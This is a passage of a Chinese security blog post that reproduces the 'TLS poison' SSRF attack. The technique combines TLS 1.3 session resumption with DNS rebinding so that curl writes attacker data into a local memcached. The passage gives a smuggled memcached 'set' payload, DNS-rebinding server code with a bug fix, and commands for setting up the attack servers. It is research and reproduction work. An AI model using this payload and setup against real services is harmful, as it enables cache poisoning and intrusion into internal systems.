字节以下。</p><p>并且按照上面我们的实验结果其中我们可以看到，按照原来作者在其仓库 README 描述的方法，我们可以从实践中看出如下几个点：</p><ul><li>双方默认使用 TLS 1.3 进行握手数据交互，当然这里需要你的 curl 支持 TLS 1.3 </li><li>TLS 1.3 使用 PSK 进行 Session Resumption</li><li>PSK 后面还包含了很多个 0x00 ，总长度远远超过了 32 字节</li></ul><p>所以作者原仓库实现的是基于 TLS 1.3 的 Session Resumption ，后面我们具体看其实现代码发现也确是如此，作者只实现了基于 PSK 的会话恢复 SSRF ，其他几类都没有实现。</p><p>所以，感觉一切都有些明朗了，那我们再来尝试一下超越 32 字节的 payload ，看看到底能不能实现。依旧按照如上的流程做好 setup ，只不过不同的是我们需要在 TLS VPS 的 redis 上修改一下 payload ，这次我们随意修改一下，只要够长就好，这里一定要注意把要发给 memcached 的 payload 当中的<code>set</code>指令的第三个参数修改成其 value 的长度，比如说我们这里修改 payload 为：<code>set payload "\r\nset foo 0 0 79\nThis time I'm really in your cache and I can write what I want into your cache.\r\n"</code>。（当然还是建议在实验之前使用之前的方法测试一下自己的 payload 能否写入到 memcached 当中）</p><p>Ok. Here we go.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/3.png" alt=""></p><p>当当，我们已经可以写入超过 32 字节的数据啦！</p><h3 id="The-Bad-Code-IN-Original-Method"><a href="#The-Bad-Code-IN-Original-Method" class="headerlink" title="The Bad Code IN Original Method"></a>The Bad Code IN Original Method</h3><p>经过上述两个实验，我已经猜到可能大多数同学的实验并不是一次都成功，很多人可能都是得到第一种结果，也就是超过了 curl 最多重定向次数而失败，而导致这个结果的原因一般来说就是 DNS Rebinding 失败，没有在第二次 DNS 查询的时候返回 127.0.0.1 ，这样一直在与 TLSServer 进行通信导致最后重定向次数过多而失败。</p><p>让我们简单看看作者的 DNS Rebinding 怎么写的，我们重点关注以下代码：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    last_ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> HOSTS_LIST:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(d[<span class="hljs-number">0</span>], domain.lower()) <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            spoof_count = (spoof_count + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-comment"># The below line will result in the answer switching after 30 seconds,</span></span><br><span class="line">            <span class="hljs-comment"># instead of alternating</span></span><br><span class="line">            <span class="hljs-comment"># return d[1] if (time() - start &gt; 30) else args.TARGET</span></span><br><span class="line">            <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> spoof_count == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> args.TARGET</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>这是作者自己写的代码</strong>，这段代码的意思大概就是通过记录 DNS 查询的总次数，如果查询总次数模 3 为 0 的话，也就是 3 的倍数，返回<code>d[1]</code>，也就是 127.0.0.1 ，否则就返回我们的 TLS VPS IP 。这种方式我们暂且不谈，先不关注。</p><p>我们再来看看其注释的方式，也就是我们可以使用注释当中的方式，DNS Server 启动 30s 之前返回 TLS VPS IP ，只需要在 30s 之后， DNS 就会一直返回我们的目标地址 127.0.0.1 。</p><p>我们现在先接受一个结论，就是 curl 对于一个域名有一定的 DNS 缓存时间，那么如果我们想让 curl 第一次 DNS 查询得到 TLS VPS IP ，在缓存时间结束之后查询的结果返回 127.0.0.1 ，那么注释当中的方式是最好不过的了。</p><p>好了，接下来就是公开处刑（我也不知道作者是不是粗心大意写出这样的代码）：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    last_ip = ip</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> HOSTS_LIST:</span><br><span class="line">        <span class="hljs-keyword">if</span> re.match(d[<span class="hljs-number">0</span>], domain.lower()) <span class="hljs-keyword">or</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            spoof_count = (spoof_count + <span class="hljs-number">1</span>) % <span class="hljs-number">3</span></span><br><span class="line">            <span class="hljs-comment"># The below line will result in the answer switching after 30 seconds,</span></span><br><span class="line">            <span class="hljs-comment"># instead of alternating</span></span><br><span class="line">            <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> (time() - start &gt; <span class="hljs-number">30</span>) <span class="hljs-keyword">else</span> args.TARGET</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>让我们再来回顾这段代码：嗯，写的非常的棒，用<code>time()</code>计时，超过 30s 就返回目标 IP ，太对了哥。如果还没看出来的同学，我再简化一下：</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spoof_count = <span class="hljs-number">0</span></span><br><span class="line">start = time()</span><br><span class="line">last_ip = <span class="hljs-literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_spoofed_IP</span><span class="hljs-params">(domain, ip)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">global</span> spoof_count</span><br><span class="line">    <span class="hljs-keyword">global</span> start</span><br><span class="line">    <span class="hljs-keyword">global</span> last_ip</span><br><span class="line">    start = time()</span><br><span class="line">    <span class="hljs-keyword">if</span> time() - start &gt; <span class="hljs-number">30</span>:</span><br><span class="line">    <span class="hljs-keyword">return</span> d[<span class="hljs-number">1</span>]</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">    <span class="hljs-keyword">return</span> args.TARGET</span><br></pre></td></tr></tbody></table></figure><p></p><p>我觉得只要你的机器稍微正常一点，正常执行几行赋值语句的 python 代码的速度应该不会超过 30s 吧？这个在使用<code>time()</code>函数对<code>start</code>变量赋值之后，又使用了<code>time()</code>函数获取时间戳与<code>start</code>变量相减。啊这，反正我的机器是减不出 30s ，这段代码就让我感觉到作者写的非常的离谱…当然这里纯属个人吐槽，这里我们只需要把函数内对于<code>start</code>变量再次赋值的操作删除就行了，这样<code>start</code>得到的时间就是程序启动的时间了。（除非我哪里误解了这段代码）</p><p>当然我建议时间间隔在 10s 这样就行，这样就能比较精准的让 curl 在第二次 DNS 查询的时候拿到 127.0.0.1 的响应了。（一只黄色的哆啦A梦：这人也太菜了.jpg</p><p>当然，或者你也可以使用总次数的方式，如果总次数超过一次立即返回 127.0.0.1 也是可以的，不过万一被别人查了第一次就尴尬了，但是一般来说不会。</p><h3 id="The-Optimization-Method-OF-DNS-Rebinding"><a href="#The-Optimization-Method-OF-DNS-Rebinding" class="headerlink" title="The Optimization Method OF DNS Rebinding"></a>The Optimization Method OF DNS Rebinding</h3><p>就像我们上文所提到的，这个攻击主要取决于两个点，一个是 TLS Session Resumption ，另一个就是 DNS Rebinding 。一个好的 DNS Rebinding 可以起到事半功倍的效果。</p><p>我询问了一些 CTFer ，也查证了一些 DNS Rebinding 的工具，诸如 <a href="https://github.com/taviso/rbndr" target="_blank" rel="noopener">rbndr</a> / ceye 等比较常用的工具，一般统一做法都是每次返回一个 TTL 较小的 A 记录，只不过每次返回的记录不同，大部分都是在用户指定的 A 记录当中随机概率返回一个。这样如果使用这些 DNS Rebinding 工具在这里就不是一个非常好的选择。</p><p>随后，@zhaojin 在 <a href="https://www.zhaoj.in/read-6681.html" target="_blank" rel="noopener">基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华</a> 提到新的方法，似乎可以使用一个域名同时分配一个 A 记录跟一个 AAAA 记录，因为 curl 会优先使用 AAAA 记录，而当 AAAA 记录的 IPv6 无法建立连接时，会尝试跟 A 记录的 IPv4 进行建立连接。我觉得是个很有趣的想法，整个思路大致如下：</p><ul><li>第一次让 curl 去访问恶意的 HTTPS 服务器，拿到一个恶意的 SessionID</li><li>然后使恶意的 HTTPS 服务器无法接收新的连接</li><li>这时恶意的 HTTPS 给出第一次返回的结果，使其进行同域名跳转</li><li>跳转时会尝试进行新连接，发现恶意的 HTTPS 服务器无法连接。</li><li>则会尝试连接这个域名下的其他记录所指向的地址，并带上 SessionID</li></ul><blockquote><p>​    在 CURL 中，对于一个域名，如果同时具有 A 记录和 AAAA 记录，那么 CURL 会去优先请求 AAAA 或者 A 记录所指向的地址，如果这些地址无法连接，则会尝试连接同时得到的 A 记录或者 AAAA 记录。</p><p>在某些情况下，会出现：</p><p>AAAA 记录地址不通，会连接到 A 记录地址上。</p><p>A记录地址不通，会连接到 AAAA 记录地址上。</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.zhaoj.in/wp-content/uploads/2020/10/1602817765b4f463b4513262746c16fe6f1b72278f-1024x377.png" alt=""></p><p>但是比较遗憾的是，如果对于一个域名进行这样的设置，AAAA 记录指向 TLS VPS 的 IPv6 地址上，A 记录指向 127.0.0.1 地址，实际测试 当中， curl 总是优先 127.0.0.1 ，并且没有随机的做法；如果对于一个域名进行这样的设置，AAAA 记录指向 ::1 地址上，A 记录指向 TLS VPS 的 IPv4 地址上，curl 总是优先 ::1 </p><blockquote class="colorquote success"><p>2021/05/14 更新：</p><p>感谢 @chuye 指出此处错误，原文已更正。</p><p>之前的错误：</p><p>如果对于一个域名进行这样的设置，AAAA 记录指向 ::ffff:127.0.0.1 或者 ::1 地址上，A 记录指向 TLS VPS 的 IPv4 地址上，虽然似乎可以做到 curl 因优先 AAAA 记录与 TLS VPS 建立连接获得恶意 Session ID ，但是实际测试默认 memcached 配置，无法通过这两个(::ffff:127.0.0.1 或者 ::1)地址进行写入 memcached 。</p><p>更正：curl 以 ::1 优先，而且原来的语序产生了错误。以及 Memcached 实际上是接受从 ::ffff:127.0.0.1 或者 ::1 写入的，详见 <a href="#IPv4-Mapped-With-Memcached">Additional Remarks</a></p></blockquote><p>虽然有些遗憾无法复现 @zhaojin 所说的这个方法，但是我觉得是个很有趣的想法，以及 @Ivan Komarov 提到 DNS 对于一个域名可以返回双 A 记录，也能有类似的效果，所以我们可以这样进行尝试：</p><ul><li>首先，默认配置下， 我们也可以通过 0.0.0.0:11211 这个地址与 memcached 通信</li><li>对于返回的双 A 记录，一个配置为 TLS VPS IP ，另一个为 0.0.0.0 ，curl 每次都会优先使用 TLS VPS IP ，如果不能通信才会接着使用 0.0.0.0:11211</li></ul><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/4.png" alt=""></p><p>那根据已知信息，那么与上文的做法类似，我们是不是也可以让 curl 第一次建立链接，拿到我们分配的 payload 后，断开连接，让其第二次连接不通而去选择另外一个 IP 呢？</p><p>事实说明，我们也确实可以这么做。基于 @Ivan Komarov 提供的 DNS Server 以及 @zhaojin 使用的 proxy.py ，我们可以拉取我整理的仓库 <a href="https://github.com/ZeddYu/TLS-poison" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison</a> 进行实验。</p><p>这里 DNS VPS 的 setup 我们需要使用 client-hello-poisoning/new-custom-dns/alternate-dns.py 进行我们域名的解析：</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">alternate-dns</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">tls</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">--ip</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">--mode</span> <span class="hljs-selector-tag">static_zero</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>x.x.x.x 为你 TLS Server IP ，mode 有两种，<code>rebinding</code>模式则为普通的重绑定解析模式，<code>static_zero</code>则是我们这次测试的双 A 记录。</p><p>TLS VPS 的 setup 还是与之前一样，只不过这次我们需要把 TLS Server 的端口绑定在 11210 上，使用 proxy.py 将 11211 的流量转发到 TLS Server 上，而且该转发只转发一次，所以可以造成 curl 第二次连接失败，也就能让其切换到另一个 IP 进行连接了。</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11210 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/root/tls/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/root/tls/privkey.pem</span> http</span><br></pre></td></tr></tbody></table></figure><p></p><p>Ok. Let’s have a try.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKu